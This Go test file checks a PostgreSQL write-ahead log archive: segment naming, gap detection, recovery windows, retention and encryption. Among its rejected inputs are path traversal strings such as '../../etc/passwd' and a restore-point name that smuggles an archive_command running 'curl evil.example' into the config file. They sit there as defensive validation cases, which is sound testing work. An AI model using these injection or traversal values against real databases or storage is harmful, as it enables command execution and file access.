// What the write-ahead log archive is allowed to claim about itself.
//
// These run without a PostgreSQL. What they hold to is the reasoning, and the
// reasoning is where the expensive mistakes live:
//
//   - a segment name is twenty-four hex characters and a path built from
//     anything else is refused, because that path goes into a bucket;
//   - the segment after `...000000FF` is `...0100000000`, not `...00000100`,
//     so an archive that wraps a log id is not full of phantom gaps;
//   - replay stops at the FIRST hole, so a window computed from the newest
//     object is a window that overstates itself;
//   - retention deletes from the OLDEST retained base backup, never the
//     newest, or the window silently shortens while the dashboard does not;
//   - a recovery target is written into a PostgreSQL configuration file, so a
//     name with a newline in it is an extra setting and not a name.
//
// The parts that need a real cluster — archiving a real segment, replaying it,
// arriving at a moment — are in pitr_test.go and are proved by doing them.
package backup

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestASegmentNameIsTwentyFourHexCharactersOrNothing(t *testing.T) {
	good := []string{
		"000000010000000000000001",
		"0000000A00000000000000FF",
		"FFFFFFFFFFFFFFFFFFFFFFFF",
	}
	for _, name := range good {
		if !ValidWALSegmentName(name) {
			t.Errorf("%q should be a segment name", name)
		}
	}

	// Every one of these becomes a path inside a bucket if it is accepted.
	bad := []string{
		"", "00000001", "00000001000000000000000",
		"00000001000000000000000g", // not hex
		"00000001000000000000000a", // lower case: PostgreSQL writes upper
		"../../etc/passwd",         // the reason this is strict
		"000000010000000000000001/../../secret",
		"000000010000000000000001 ",
	}
	for _, name := range bad {
		if ValidWALSegmentName(name) {
			t.Errorf("%q must not be accepted as a segment name", name)
		}
	}
}

func TestTheSegmentAfterTheLastOneInALogIDIsTheFirstOfTheNext(t *testing.T) {
	// The whole reason segment arithmetic is arithmetic. A string increment
	// makes this `...00000100`, which does not exist, and every wrap in the
	// archive then reads as a gap.
	layout := DefaultWALLayout()
	last, ok := ParseWALSegment("0000000100000000000000FF")
	if !ok {
		t.Fatal("that is a segment name")
	}
	if got := last.Next(layout).String(); got != "000000010000000100000000" {
		t.Errorf("after ...000000FF comes %s, want 000000010000000100000000", got)
	}

	// And within a log id it is an ordinary increment.
	mid, _ := ParseWALSegment("000000010000000000000003")
	if got := mid.Next(layout).String(); got != "000000010000000000000004" {
		t.Errorf("after ...00000003 comes %s", got)
	}
}

func TestSegmentArithmeticFollowsTheGeometryTheClusterWasBuiltWith(t *testing.T) {
	// A cluster initialised with 64 MiB segments has 64 of them per log id,
	// not 256. Reading that archive with the default geometry would report a
	// gap at every wrap — a false alarm that teaches an operator to ignore the
	// real one.
	big := WALLayout{SegmentSize: 64 << 20}
	if got := big.SegmentsPerLogID(); got != 64 {
		t.Fatalf("64 MiB segments give %d per log id, want 64", got)
	}
	last, _ := ParseWALSegment("00000001000000000000003F")
	if got := last.Next(big).String(); got != "000000010000000100000000" {
		t.Errorf("after ...0000003F at 64 MiB comes %s", got)
	}
}

func TestAnLSNMapsToTheSegmentThatHoldsIt(t *testing.T) {
	layout := DefaultWALLayout()
	lsn, ok := ParseLSN("0/3000028")
	if !ok {
		t.Fatal("0/3000028 is an LSN")
	}
	if got := SegmentForLSN(1, lsn, layout).String(); got != "000000010000000000000003" {
		t.Errorf("0/3000028 is in %s, want 000000010000000000000003", got)
	}
	if got := FormatLSN(lsn); got != "0/03000028" {
		t.Errorf("formatted back as %s", got)
	}

	// A target that silently became zero would recover to the beginning of
	// time and report success.
	for _, bad := range []string{"", "/", "abc", "0/", "/28", "0/3000028/9"} {
		if _, ok := ParseLSN(bad); ok {
			t.Errorf("%q must not parse as an LSN", bad)
		}
	}
}

func TestAnObjectKeyIsOnlyEverBuiltFromAValidName(t *testing.T) {
	key, err := WALSegmentKey("rawsyst", "000000010000000000000001")
	if err != nil {
		t.Fatalf("a real segment name was refused: %v", err)
	}
	if key != "rawsyst/wal/00000001/000000010000000000000001" {
		t.Errorf("segment key is %q", key)
	}

	// The refusal is the point. Anything that is not a segment, a history file
	// or a backup label never becomes a path.
	for _, bad := range []string{
		"../../../etc/passwd",
		"000000010000000000000001/../../..",
		"..",
		"",
	} {
		if _, err := WALKeyFor("rawsyst", bad); err == nil {
			t.Errorf("%q was turned into an object key", bad)
		}
	}

	// And a configured prefix cannot be a path either.
	for _, prefix := range []string{"../../elsewhere", "..", "/", ""} {
		key, err := WALSegmentKey(prefix, "000000010000000000000001")
		if err != nil {
			t.Fatalf("prefix %q: %v", prefix, err)
		}
		if strings.Contains(key, "..") || strings.HasPrefix(key, "/") {
			t.Errorf("prefix %q produced %q", prefix, key)
		}
	}
}

func TestHistoryFilesAndBackupLabelsAreRecognisedAndNothingElseIs(t *testing.T) {
	cases := map[string]string{
		"000000010000000000000001":                 WALKindSegment,
		"00000002.history":                         WALKindHistory,
		"000000010000000000000002.00000028.backup": WALKindBackupLabel,
	}
	for name, want := range cases {
		got, ok := ArchivableName(name)
		if !ok || got != want {
			t.Errorf("%q read as %q/%v, want %q", name, got, ok, want)
		}
	}
	for _, bad := range []string{
		"0000000.history", "0000000G.history", "history",
		"000000010000000000000002.backup", "anything.backup",
		"postgresql.conf", "pg_hba.conf",
	} {
		if _, ok := ArchivableName(bad); ok {
			t.Errorf("%q must not be archivable", bad)
		}
	}
}

// --- gaps -------------------------------------------------------------------

func TestReplayStopsAtTheFirstHoleNotAtTheLastObject(t *testing.T) {
	// The single most expensive misunderstanding available here. An archive
	// with one segment missing near the beginning and a thousand behind it can
	// recover to the segment before the hole and no further.
	layout := DefaultWALLayout()
	names := []string{
		"000000010000000000000001",
		"000000010000000000000002",
		// 03 is missing.
		"000000010000000000000004",
		"000000010000000000000005",
	}
	gaps, contiguous := findGaps(names, layout)
	if len(gaps) != 1 {
		t.Fatalf("found %d gaps, want 1: %+v", len(gaps), gaps)
	}
	if gaps[0].From != "000000010000000000000003" ||
		gaps[0].To != "000000010000000000000003" || gaps[0].Count != 1 {
		t.Errorf("the gap is described as %+v", gaps[0])
	}
	if contiguous != "000000010000000000000002" {
		t.Errorf("replay can reach %s, want ...00000002", contiguous)
	}
}

func TestAnUnbrokenRunHasNoGapsAndReachesTheEnd(t *testing.T) {
	names := []string{
		"0000000100000000000000FD",
		"0000000100000000000000FE",
		"0000000100000000000000FF",
		"000000010000000100000000", // the wrap
		"000000010000000100000001",
	}
	gaps, contiguous := findGaps(names, DefaultWALLayout())
	if len(gaps) != 0 {
		t.Errorf("a run across a log id wrap reported %d gaps: %+v", len(gaps), gaps)
	}
	if contiguous != "000000010000000100000001" {
		t.Errorf("replay reaches %s", contiguous)
	}
}

// --- the recovery window ----------------------------------------------------

func baseAt(id string, at time.Time, timeline uint32, start string) BaseManifest {
	return BaseManifest{
		ID: id, Timeline: timeline, StartSegment: start,
		StartedAt:   at.Add(-time.Minute).Format(time.RFC3339),
		CompletedAt: at.Format(time.RFC3339),
	}
}

func TestThereIsNoRecoveryWindowWithoutABaseBackup(t *testing.T) {
	// The archive on its own recovers nothing: the log describes changes to
	// pages and there are no pages to replay them onto.
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	inv := ArchiveInventory{Timelines: []TimelineArchive{{
		Timeline: 1, Segments: 500,
		First: "000000010000000000000001",
		Last:  "0000000100000000000001F4",
	}}}
	w := windowFrom(nil, inv, now)
	if w.Available {
		t.Fatal("a window was offered with no base backup")
	}
	if !strings.Contains(w.Because, "base backup") {
		t.Errorf("the reason given was %q", w.Because)
	}
}

func TestTheWindowStartsAtTheOLDESTBaseBackupNotTheNewest(t *testing.T) {
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	oldest := now.Add(-6 * 24 * time.Hour)
	newest := now.Add(-12 * time.Hour)

	bases := []BaseManifest{
		baseAt("20260911T000000Z-1", newest, 1, "000000010000000000000100"),
		baseAt("20260905T120000Z-1", oldest, 1, "000000010000000000000001"),
	}
	inv := ArchiveInventory{Timelines: []TimelineArchive{{
		Timeline: 1, Segments: 300,
		First:          "000000010000000000000001",
		Last:           "00000001000000000000012C",
		ContiguousTo:   "00000001000000000000012C",
		LastArchivedAt: now.Add(-time.Minute),
	}}}

	w := windowFrom(bases, inv, now)
	if !w.Available {
		t.Fatalf("no window: %s", w.Because)
	}
	if !w.Start.Equal(oldest) {
		t.Errorf("window starts at %s, want the oldest base backup at %s",
			w.Start, oldest)
	}
	if w.EarliestBaseBackup != "20260905T120000Z-1" {
		t.Errorf("earliest base backup reported as %s", w.EarliestBaseBackup)
	}
}

func TestAGapCutsTheWindowShortOfTheNewestObject(t *testing.T) {
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	base := baseAt("20260910T000000Z-1", now.Add(-36*time.Hour), 1,
		"000000010000000000000001")

	inv := ArchiveInventory{Timelines: []TimelineArchive{{
		Timeline: 1, Segments: 300,
		First: "000000010000000000000001",
		Last:  "00000001000000000000012C",
		// Replay can only reach here.
		ContiguousTo:   "000000010000000000000050",
		LastArchivedAt: now.Add(-time.Minute),
		Gaps: []WALGap{{
			Timeline: 1, From: "000000010000000000000051",
			To: "000000010000000000000051", Count: 1,
		}},
	}}}

	w := windowFrom([]BaseManifest{base}, inv, now)
	if !w.Truncated {
		t.Fatal("a window with a gap in it was not reported as truncated")
	}
	if w.End.After(now.Add(-time.Hour)) {
		t.Errorf("the window ends at %s, which is past the gap", w.End)
	}
	if len(w.Gaps) != 1 {
		t.Errorf("the gap was not carried into the window: %+v", w.Gaps)
	}
}

func TestAMomentOutsideTheWindowIsRefusedWithAReason(t *testing.T) {
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	w := RecoveryWindow{
		Available:          true,
		Start:              now.Add(-7 * 24 * time.Hour),
		End:                now.Add(-time.Minute),
		EarliestBaseBackup: "20260904T120000Z-1",
	}

	if err := ExplainTarget(w, now.Add(-3*24*time.Hour)); err != nil {
		t.Fatalf("a moment inside the window was refused: %v", err)
	}

	tooEarly := ExplainTarget(w, now.Add(-30*24*time.Hour))
	if tooEarly == nil {
		t.Fatal("a moment before the window was accepted")
	}
	if !strings.Contains(tooEarly.Error(), "20260904T120000Z-1") {
		t.Errorf("the refusal does not name the oldest base backup: %v", tooEarly)
	}

	if ExplainTarget(w, now.Add(time.Hour)) == nil {
		t.Error("a moment after the window was accepted")
	}
}

func TestARecoveryStartsFromTheNEWESTBaseBackupBeforeTheTarget(t *testing.T) {
	// Starting from an older one is correct and costs a week of replay to
	// arrive at the same place.
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	bases := []BaseManifest{
		baseAt("c", now.Add(-2*time.Hour), 1, "000000010000000000000300"),
		baseAt("b", now.Add(-30*time.Hour), 1, "000000010000000000000200"),
		baseAt("a", now.Add(-72*time.Hour), 1, "000000010000000000000100"),
	}
	chosen, err := BaseBackupFor(bases, now.Add(-20*time.Hour))
	if err != nil {
		t.Fatalf("no base backup chosen: %v", err)
	}
	if chosen.ID != "b" {
		t.Errorf("chose %s, want b — the newest that finished before the target",
			chosen.ID)
	}

	if _, err := BaseBackupFor(bases, now.Add(-200*time.Hour)); err == nil {
		t.Error("a target before every base backup was accepted")
	}
}

// --- retention --------------------------------------------------------------

func TestRetentionKeepsTheBaseBackupTheWindowActuallyNeeds(t *testing.T) {
	// A seven-day window needs the newest base backup taken BEFORE seven days
	// ago, not merely every one taken inside the window. Keeping only the ones
	// inside it would leave the oldest recoverable moment with nothing to
	// replay onto.
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	policy := PITRPolicy{Window: 7 * 24 * time.Hour, KeepBaseBackups: 1}

	bases := []BaseManifest{
		baseAt("d", now.Add(-1*24*time.Hour), 1, "000000010000000000000400"),
		baseAt("c", now.Add(-4*24*time.Hour), 1, "000000010000000000000300"),
		baseAt("b", now.Add(-9*24*time.Hour), 1, "000000010000000000000200"),
		baseAt("a", now.Add(-20*24*time.Hour), 1, "000000010000000000000100"),
	}
	keep, drop := planBaseBackups(bases, policy, now)

	kept := ids(keep)
	if len(kept) != 3 || kept[len(kept)-1] != "b" {
		t.Fatalf("kept %v, want d, c and b — b is what the far end of the "+
			"window replays onto", kept)
	}
	if got := ids(drop); len(got) != 1 || got[0] != "a" {
		t.Errorf("dropped %v, want only a", got)
	}
}

func TestRetentionNeverKeepsFewerThanTheFloorHoweverOldTheyAre(t *testing.T) {
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	policy := PITRPolicy{Window: time.Hour, KeepBaseBackups: 2}
	bases := []BaseManifest{
		baseAt("b", now.Add(-100*24*time.Hour), 1, "000000010000000000000200"),
		baseAt("a", now.Add(-200*24*time.Hour), 1, "000000010000000000000100"),
	}
	keep, drop := planBaseBackups(bases, policy, now)
	if len(keep) != 2 || len(drop) != 0 {
		t.Errorf("kept %v and dropped %v; the floor is two", ids(keep), ids(drop))
	}
}

func TestWALBeforeTheOldestKeptBaseBackupGoesAndNothingElseDoes(t *testing.T) {
	opts := WALOptions{Prefix: "rawsyst", Layout: DefaultWALLayout()}
	horizon, _ := ParseWALSegment("000000010000000000000010")

	objects := []storeListing{}
	for _, n := range []string{
		"00000001000000000000000E", // before the horizon: removable
		"00000001000000000000000F", // before the horizon: removable
		"000000010000000000000010", // the horizon itself: kept
		"000000010000000000000011", // after: kept
	} {
		objects = append(objects,
			storeListing{Key: "rawsyst/wal/00000001/" + n, Size: 100},
			storeListing{Key: "rawsyst/wal/00000001/" + n + ".meta", Size: 10})
	}

	removable, kept, _, _, _ := classifySegments(
		asBlobObjects(objects), opts, horizon, time.Now().Add(-time.Hour))

	// Two segments, each with its sidecar.
	if len(removable) != 4 {
		t.Fatalf("removing %d keys, want 4 (two segments and two records): %v",
			len(removable), removable)
	}
	if kept != 2 {
		t.Errorf("kept %d segments, want 2", kept)
	}
	for _, key := range removable {
		if strings.Contains(key, "000000010000000000000010") ||
			strings.Contains(key, "000000010000000000000011") {
			t.Errorf("%s is at or after the horizon and must not be removed", key)
		}
	}
}

func TestHistoryFilesAreNeverRemoved(t *testing.T) {
	// A few hundred bytes each, and without them a recovery cannot work out
	// which branch a segment belongs to.
	opts := WALOptions{Prefix: "rawsyst", Layout: DefaultWALLayout()}
	horizon, _ := ParseWALSegment("000000020000000000000010")
	objects := []storeListing{
		{Key: "rawsyst/wal/history/00000002.history", Size: 60},
		{Key: "rawsyst/wal/history/00000002.history.meta", Size: 10},
	}
	removable, _, _, _, _ := classifySegments(
		asBlobObjects(objects), opts, horizon, time.Now())
	if len(removable) != 0 {
		t.Errorf("a history file was scheduled for removal: %v", removable)
	}
}

func TestPruningRefusesWhenItCannotWorkOutWhatIsStillNeeded(t *testing.T) {
	f := newFakeStore(t)
	opts := f.walOptions()

	// No base backups at all: nothing can be said about which segments matter.
	report, err := PruneWAL(context.Background(), opts, DefaultPITRPolicy, true)
	if err != nil {
		t.Fatalf("prune errored rather than refusing: %v", err)
	}
	if report.Refused == "" {
		t.Fatal("prune did not refuse with no base backup to reason from")
	}
	if report.RemovedSegments != 0 {
		t.Errorf("it would have removed %d segments anyway", report.RemovedSegments)
	}
}

// --- recovery targets -------------------------------------------------------

func TestARecoveryTargetCannotSmuggleASettingIntoTheConfigFile(t *testing.T) {
	// These values are written into postgresql.auto.conf, which PostgreSQL
	// parses as settings. A newline in a restore point name is not a broken
	// name, it is an extra setting — and the settings available include
	// archive_command, which is a shell command run as the database user.
	for _, value := range []string{
		"safe'\narchive_command = 'curl evil.example'",
		"name with spaces",
		"name'; DROP",
		strings.Repeat("a", 64),
		"",
	} {
		target := RecoveryTarget{Kind: TargetName, Value: value}
		if err := target.Validate(); err == nil {
			t.Errorf("restore point name %q was accepted", value)
		}
	}
	if err := (RecoveryTarget{Kind: TargetName, Value: "before-the-import"}).
		Validate(); err != nil {
		t.Errorf("an ordinary restore point name was refused: %v", err)
	}
}

func TestARecoveryTargetInTheFutureIsRefusedBeforeAnythingIsSpent(t *testing.T) {
	// PostgreSQL reports this AFTER the replay, as a fatal error, having done
	// the work.
	future := RecoveryTarget{Kind: TargetTime, At: time.Now().Add(48 * time.Hour)}
	if err := future.Validate(); err == nil {
		t.Fatal("a recovery target in the future was accepted")
	}
	past := RecoveryTarget{Kind: TargetTime, At: time.Now().Add(-time.Hour)}
	if err := past.Validate(); err != nil {
		t.Errorf("a target an hour ago was refused: %v", err)
	}
}

func TestEveryTargetKindSaysWhatItMeansInWords(t *testing.T) {
	// This sentence is shown on a confirmation screen before somebody commits
	// to a recovery, so an empty or wrong one is a person confirming something
	// other than what they asked for.
	for _, target := range []RecoveryTarget{
		{Kind: TargetLatest},
		{Kind: TargetImmediate},
		{Kind: TargetTime, At: time.Now()},
		{Kind: TargetBeforeTime, At: time.Now()},
		{Kind: TargetLSN, Value: "0/3000028"},
		{Kind: TargetName, Value: "before-the-import"},
		{Kind: TargetXID, Value: "4711"},
	} {
		if d := target.Describe(); len(d) < 10 {
			t.Errorf("%s describes itself as %q", target.Kind, d)
		}
	}
	if err := (RecoveryTarget{Kind: "whenever"}).Validate(); err == nil {
		t.Error("an unknown target kind was accepted")
	}
}

// --- the archive, against a real store --------------------------------------

func TestArchivingWritesTheObjectAndThenTheRecord(t *testing.T) {
	f := newFakeStore(t)
	opts := f.walOptions()
	name := "000000010000000000000001"
	src := writeSegment(t, name, []byte("write-ahead log contents"))

	res, err := ArchiveFile(context.Background(), opts, src, name)
	if err != nil {
		t.Fatalf("archiving failed: %v", err)
	}
	if res.AlreadyThere {
		t.Error("a first archive reported that it was already there")
	}
	key := "rawsyst/wal/00000001/" + name
	if !f.has(key) || !f.has(key+".meta") {
		t.Fatalf("the object or its record is missing: %v", f.keysUnder("rawsyst/"))
	}

	// Compressed: the segment is highly repetitive and the stored object must
	// be smaller than the plaintext, or the compression step is not running.
	if res.StoredBytes >= res.PlainBytes*4 {
		t.Errorf("stored %d bytes for %d of plaintext", res.StoredBytes, res.PlainBytes)
	}
}

func TestArchivingTheSameSegmentTwiceIsFineAndDifferentContentsIsNot(t *testing.T) {
	f := newFakeStore(t)
	opts := f.walOptions()
	name := "000000010000000000000001"

	src := writeSegment(t, name, []byte("the original contents"))
	if _, err := ArchiveFile(context.Background(), opts, src, name); err != nil {
		t.Fatalf("first archive: %v", err)
	}

	// PostgreSQL re-archives after a crash, and identical content is a
	// success.
	res, err := ArchiveFile(context.Background(), opts, src, name)
	if err != nil {
		t.Fatalf("re-archiving identical contents failed: %v", err)
	}
	if !res.AlreadyThere {
		t.Error("re-archiving identical contents did not say it was already there")
	}

	// Different content under the same name means two clusters are sharing a
	// prefix, or the archive has been written to by something else. Quietly
	// overwriting would destroy a recovery point.
	other := writeSegment(t, name+"-other", []byte("completely different"))
	if _, err := ArchiveFile(context.Background(), opts, other, name); err == nil {
		t.Fatal("a different segment was written over an existing one")
	}
}

func TestAnUnreachableStoreFailsTheArchiveSoPostgreSQLKeepsTheSegment(t *testing.T) {
	// The whole safety property. Exit zero means the segment is safe somewhere
	// else and PostgreSQL may recycle it; anything else must be non-zero.
	f := newFakeStore(t)
	opts := f.walOptions()
	name := "000000010000000000000001"
	src := writeSegment(t, name, []byte("contents"))

	f.setDown(true)
	if _, err := ArchiveFile(context.Background(), opts, src, name); err == nil {
		t.Fatal("archiving reported success with the store unreachable")
	}

	f.setDown(false)
	if _, err := ArchiveFile(context.Background(), opts, src, name); err != nil {
		t.Fatalf("archiving still failed once the store came back: %v", err)
	}
}

func TestAnObjectWithoutItsRecordIsNotInTheArchive(t *testing.T) {
	// Writing the record last is what makes "present" mean "whole". An upload
	// that died between the two must count as a gap, not as a segment.
	f := newFakeStore(t)
	opts := f.walOptions()
	name := "000000010000000000000001"
	src := writeSegment(t, name, []byte("contents"))

	f.failPutsMatching = ".meta"
	if _, err := ArchiveFile(context.Background(), opts, src, name); err == nil {
		t.Fatal("archiving succeeded without writing the record")
	}
	f.failPutsMatching = ""

	found, err := HasWALFile(context.Background(), opts, name)
	if err != nil {
		t.Fatalf("looking for the segment failed: %v", err)
	}
	if found {
		t.Error("a segment with no record beside it was reported as archived")
	}

	report, err := VerifyArchive(context.Background(), opts, 0)
	if err != nil {
		t.Fatalf("verify: %v", err)
	}
	if report.Passed {
		t.Error("an archive with an unfinished upload in it passed")
	}
	if len(report.Incomplete) != 1 {
		t.Errorf("the unfinished upload was not reported: %+v", report)
	}
}

func TestACorruptedSegmentIsRefusedRatherThanRestored(t *testing.T) {
	f := newFakeStore(t)
	opts := f.walOptions()
	name := "000000010000000000000001"
	src := writeSegment(t, name, []byte("the contents that matter"))
	if _, err := ArchiveFile(context.Background(), opts, src, name); err != nil {
		t.Fatalf("archive: %v", err)
	}

	f.corrupt("rawsyst/wal/00000001/" + name)

	dest := filepath.Join(t.TempDir(), name)
	_, err := FetchFile(context.Background(), opts, name, dest)
	if err == nil {
		t.Fatal("a corrupted segment was restored")
	}
	if !strings.Contains(err.Error(), "checksum") {
		t.Errorf("the refusal does not mention the checksum: %v", err)
	}
	if _, statErr := os.Stat(dest); statErr == nil {
		t.Error("a file was written despite the refusal")
	}
}

func TestATruncatedSegmentIsRefused(t *testing.T) {
	f := newFakeStore(t)
	opts := f.walOptions()
	name := "000000010000000000000001"
	src := writeSegment(t, name, make([]byte, 64<<10))
	if _, err := ArchiveFile(context.Background(), opts, src, name); err != nil {
		t.Fatalf("archive: %v", err)
	}

	f.truncate("rawsyst/wal/00000001/" + name)

	dest := filepath.Join(t.TempDir(), name)
	if _, err := FetchFile(context.Background(), opts, name, dest); err == nil {
		t.Fatal("a truncated segment was restored")
	}

	// And the cheap check finds it from the listing alone, without egress.
	report, err := VerifyArchive(context.Background(), opts, 0)
	if err != nil {
		t.Fatalf("verify: %v", err)
	}
	if len(report.WrongSize) != 1 {
		t.Errorf("the truncation was not found from the listing: %+v", report)
	}
}

func TestAMissingSegmentIsNotFoundRatherThanAnError(t *testing.T) {
	// Recovery ends when restore_command cannot supply the next segment.
	// PostgreSQL asks for one past the end of the archive every single time,
	// so this has to be an ordinary answer and not a failure.
	f := newFakeStore(t)
	opts := f.walOptions()
	dest := filepath.Join(t.TempDir(), "seg")

	_, err := FetchFile(context.Background(), opts,
		"0000000100000000000000FF", dest)
	if err == nil {
		t.Fatal("a segment that is not there came back")
	}
	if !strings.Contains(err.Error(), "not_found") {
		t.Errorf("a missing segment reported as %v, want not_found", err)
	}
}

func TestTheWrongKeySaysSoRatherThanReportingCorruption(t *testing.T) {
	// "You have the wrong key" is a five-minute fix. "Decryption failed" is an
	// afternoon.
	f := newFakeStore(t)
	right := f.walOptions()
	key, err := ParseKey(testKeyB64(1))
	if err != nil {
		t.Fatal(err)
	}
	right.Key = key

	name := "000000010000000000000001"
	src := writeSegment(t, name, []byte("secret contents"))
	if _, err := ArchiveFile(context.Background(), right, src, name); err != nil {
		t.Fatalf("archive: %v", err)
	}

	wrong := f.walOptions()
	otherKey, err := ParseKey(testKeyB64(2))
	if err != nil {
		t.Fatal(err)
	}
	wrong.Key = otherKey

	dest := filepath.Join(t.TempDir(), name)
	_, err = FetchFile(context.Background(), wrong, name, dest)
	if err == nil {
		t.Fatal("a segment was decrypted with the wrong key")
	}
	if !strings.Contains(err.Error(), "wrong key") {
		t.Errorf("the message was %v", err)
	}

	// And with no key at all it says which key is needed, by fingerprint.
	none := f.walOptions()
	_, err = FetchFile(context.Background(), none, name, dest)
	if err == nil {
		t.Fatal("an encrypted segment was read with no key configured")
	}
	if !strings.Contains(err.Error(), key.Fingerprint()) {
		t.Errorf("the message does not name the key needed: %v", err)
	}
}

func TestAnEncryptedSegmentDoesNotLeaveInPlaintext(t *testing.T) {
	f := newFakeStore(t)
	opts := f.walOptions()
	key, err := ParseKey(testKeyB64(3))
	if err != nil {
		t.Fatal(err)
	}
	opts.Key = key

	secret := []byte("CUSTOMER NAME AND BANK DETAILS")
	name := "000000010000000000000001"
	src := writeSegment(t, name, secret)
	if _, err := ArchiveFile(context.Background(), opts, src, name); err != nil {
		t.Fatalf("archive: %v", err)
	}

	f.mu.Lock()
	stored := f.objects["rawsyst/wal/00000001/"+name]
	f.mu.Unlock()
	if strings.Contains(string(stored), "BANK DETAILS") {
		t.Fatal("the plaintext is in the object")
	}
	if !IsSealed(stored) {
		t.Fatal("the object is not sealed")
	}

	// The record beside it must not carry the key either.
	f.mu.Lock()
	meta := string(f.objects["rawsyst/wal/00000001/"+name+".meta"])
	f.mu.Unlock()
	if strings.Contains(meta, testKeyB64(3)) {
		t.Fatal("the encryption key is in the record beside the object")
	}
	if !strings.Contains(meta, key.Fingerprint()) {
		t.Error("the record does not identify which key was used")
	}
}

func TestAnUnreachableStoreIsAFindingNotASilentGreen(t *testing.T) {
	f := newFakeStore(t)
	f.setDown(true)

	status := BuildArchiveStatus(
		ArchiverStats{
			Archiving: true, WALLevel: "replica",
			SegmentSize:     DefaultWALSegmentSize,
			LastArchivedWAL: "000000010000000000000005",
			LastArchivedAt:  time.Now().Add(-time.Minute),
			ArchivedCount:   5,
		},
		ArchiveInventory{},
		errUnreachable(),
		RecoveryWindow{Available: true},
		[]BaseManifest{baseAt("a", time.Now().Add(-time.Hour), 1, "0000000100000000000000001"[:24])},
		time.Now())

	if status.Health != ArchiveRed {
		t.Fatalf("a store that cannot be reached is %s", status.Health)
	}
	if status.StoreReachable {
		t.Error("the store was reported as reachable")
	}
}

func TestArchivingBeingOffIsRedHoweverHealthyEverythingElseIs(t *testing.T) {
	status := BuildArchiveStatus(
		ArchiverStats{Archiving: false, WALLevel: "replica",
			SegmentSize: DefaultWALSegmentSize},
		ArchiveInventory{}, nil,
		RecoveryWindow{Available: true},
		[]BaseManifest{baseAt("a", time.Now(), 1, "000000010000000000000001")},
		time.Now())
	if status.Health != ArchiveRed {
		t.Fatalf("archive_mode off reads as %s", status.Health)
	}
	if !strings.Contains(status.Summary, "archive_mode") {
		t.Errorf("the summary does not say what is wrong: %q", status.Summary)
	}
}

func TestAStoreErrorNeverCarriesASignedURLIntoTheReadout(t *testing.T) {
	// The readout is written into a row every platform operator can read.
	msg := redactStoreError(errWithURL())
	if strings.Contains(msg, "X-Amz-Signature") ||
		strings.Contains(msg, "deadbeefsignature") {
		t.Fatalf("a signature reached the readout: %q", msg)
	}
	if !strings.Contains(msg, "403") {
		t.Errorf("the useful half was removed too: %q", msg)
	}
}

// --- helpers ----------------------------------------------------------------

type storeListing struct {
	Key  string
	Size int64
}

func ids(manifests []BaseManifest) []string {
	out := make([]string, 0, len(manifests))
	for _, m := range manifests {
		out = append(out, m.ID)
	}
	return out
}

func writeSegment(t *testing.T, name string, contents []byte) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, contents, 0o600); err != nil {
		t.Fatalf("writing a test segment: %v", err)
	}
	return path
}

// testKeyB64 is a deterministic 32-byte key, base64 encoded.
//
// Named apart from `testKey` in backup_test.go, which returns a parsed Key: the
// two are wanted in different forms and a test that needed both would otherwise
// have to unparse one.
func testKeyB64(seed byte) string {
	material := make([]byte, 32)
	for i := range material {
		material[i] = seed*17 + byte(i)
	}
	return base64Std(material)
}
